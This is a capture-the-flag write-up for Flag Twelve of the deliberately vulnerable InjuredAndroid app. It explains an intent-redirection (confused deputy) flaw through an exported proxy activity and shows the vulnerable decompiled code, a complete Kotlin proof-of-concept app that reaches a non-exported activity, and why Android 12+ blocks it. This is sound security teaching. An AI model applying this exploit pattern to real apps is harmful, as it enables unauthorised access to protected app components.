# FLAG TWELVE – (PROTECTED COMPONENTS)

For this challenge, you will have to downgrade to SDK 30 (Android 11) as this exploit no longer works on versions 12+ (Explanation towards the bottom). In this challenge, you want to access `FlagTwelveProtectedActivity` and execute its success function `F()`, which gives you the flag.

## The Problem: Access Control

If you look at the **Manifest** (`AndroidManifest.xml`), you will see this entry:

```xml
<activity
    android:theme="@style/AppTheme.NoActionBar"
    android:label="@string/title_activity_flag_twelve_protected"
    android:name="b3nac.injuredandroid.FlagTwelveProtectedActivity"/>
```

- **Missing `exported` attribute:** By default (on newer Android versions) or if omitted without an intent-filter, this activity is **not exported**.
- **Result:** You (as an external user or malicious app) cannot launch this activity directly. If you try `adb shell am start -n ...FlagTwelveProtectedActivity`, the OS blocks you with a `Permission Denial`.

## The Vulnerability: The "Proxy" (Exported Activity)

The developer left another door open. Look at the entry for `ExportedProtectedIntent` in the Manifest:

```xml
<activity
    android:theme="@style/AppTheme.NoActionBar"
    android:label="@string/title_activity_exported_protected_intent"
    android:name="b3nac.injuredandroid.ExportedProtectedIntent"
    android:exported="true"/>
```

- **`exported="true"`:** This explicitly tells the Android OS, "Allow any other app to launch me."

## The Code Flaw: Intent Redirection

Now look at the code for `ExportedProtectedIntent`.

```java
// Triggered every time the activity comes to the foreground
protected void onResume() {
    super.onResume();
    F(getIntent());
}

private void F(Intent intent) {
    // 1. Unpacking the Trojan Horse
    Intent intent2 = (Intent) intent.getParcelableExtra("access_protected_component");
    
    // 2. The Flawed Check
    if (intent2.resolveActivity(getPackageManager()).getPackageName().equals("b3nac.injuredandroid")) {
        // 3. Launching with Internal Privileges
        startActivity(intent2);
    }
}
```

1. **Unpacking:** It takes an Intent *you* created (passed as an extra named `access_protected_component`).
2. **The Check:** It checks if your intent is pointing to the `b3nac.injuredandroid` package. Since you want to attack `FlagTwelve` (which is inside that package), this check passes.
3. **The Launch:** It calls `startActivity(intent2)`.
    - **Crucial Detail:** When `ExportedProtectedIntent` calls `startActivity`, it runs with the privileges of the **InjuredAndroid app itself**, not your malicious app.
    - **Result:** Since `InjuredAndroid` is allowed to open its own private (non-exported) activities, the OS allows the launch! You used the exported activity as a "proxy" to reach the protected one.

## The Logic Bypass: Flag Twelve

Once you successfully proxy your intent to `FlagTwelveProtectedActivity`, you still have to pass its internal logic check to get the flag.

```java
protected void onCreate(Bundle bundle) {
    // ...
    // 1. Get the secret string
    Uri parse = Uri.parse(getIntent().getStringExtra("totally_secure"));
    
    // 2. Check if scheme is "https"
    if (!d.s.d.g.a("https", parse.getScheme())) {
        // Fail condition (loads webview)
        return;
    }
    
    // 3. Success condition
    F(); // Grants flag
}
```

- **The Check:** It parses the string you sent (`totally_secure`) as a URI and checks if the scheme is `https`.
- **Your Payload:** You sent `https://google.com`.
- **Result:** `parse.getScheme()` returns `"https"`. The check passes, and `F()` is called.

This is a [**Confused Deputy**](https://cwe.mitre.org/data/definitions/441.html) attack where you trick a privileged component (the exported activity) into performing an action it shouldn't (launching a private component) on your behalf.

## PoC

```java
package com.flag12_poc

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.view.View
import android.widget.Button

// Changed from AppCompatActivity to Activity to avoid dependency issues
class MainActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Create a simple button programmatically
        val button = Button(this)
        button.text = "Trigger ExportedProtectedIntent (Flag 12)"

        // Set the button as the content view
        setContentView(button)

        // Set the click listener
        button.setOnClickListener {
            exploit()
        }
    }

    private fun exploit() {
        // 1. Create the Payload Intent (Targeting Flag 12)
        val payload = Intent()
        payload.setClassName(
            "b3nac.injuredandroid",
            "b3nac.injuredandroid.FlagTwelveProtectedActivity"
        )
        // Add the extra required to bypass the "https" check
        payload.putExtra("totally_secure", "https://google.com")

        // 2. Create the Wrapper Intent (Targeting the Proxy)
        val wrapper = Intent()
        wrapper.setClassName(
            "b3nac.injuredandroid",
            "b3nac.injuredandroid.ExportedProtectedIntent"
        )
        // Pack the payload intent inside the wrapper
        wrapper.putExtra("access_protected_component", payload)

        // 3. Launch the wrapper intent
        startActivity(wrapper)
    }
}

```

![image.png](FLAG%20TWELVE%20%E2%80%93%20(PROTECTED%20COMPONENTS)/image.png)

The PoC won't work on SDK 36 (Android 16 / Android 12+) because Google introduced a specific security mitigation called **Intent Redirection Hardening** (specifically strict validation of pending intents and nested intents).

## The Security Mechanism: "Attribution"

On older Android versions (SDK < 31), when App A (Attacker) sends an Intent to App B (Proxy), and App B launches that Intent using `startActivity()`, the OS sees the final launch request coming from **App B**. Since App B has permission to access its own private components, the launch succeeds.

On SDK 31+ (Android 12 and newer), the OS is smarter. It tracks the **chain of custody**.

1. **Attacker App** creates the Intent.
2. **Attacker App** passes it to **Proxy App**.
3. **Proxy App** tries to `startActivity()` with that *same intent object*.

The OS looks at the Intent and sees it was originally "created" or "sourced" from the **Attacker App** (Package `com.flag12_poc`).

It then performs the permission check:

> *"Does com.flag12_poc have permission to launch the non-exported activity b3nac.injuredandroid.FlagTwelveProtectedActivity?"*
> 

**Answer:** No.

**Result:** `SecurityException`.

## The Error Message

`[IntentRedirect Hardening] INTENT_REDIRECT_ABORT_START_ANY_ACTIVITY_PERMISSION ... intentCreatorUid: 10321 (You); callingUid: 10318 (InjuredAndroid)`

The OS explicitly identifies the `intentCreatorUid` (you) and denies the request, even though the `callingUid` (the proxy) is privileged.

![Android Studio 2025-12-16 19.07.42.png](FLAG%20TWELVE%20%E2%80%93%20(PROTECTED%20COMPONENTS)/Android_Studio_2025-12-16_19.07.42.png)

### Sources

[**Android Developer Docs: Intent Redirection**](https://developer.android.com/privacy-and-security/risks/intent-redirection)

[**Google Support: Remediation for Intent Redirection Vulnerability**](https://support.google.com/faqs/answer/9267555?hl=en)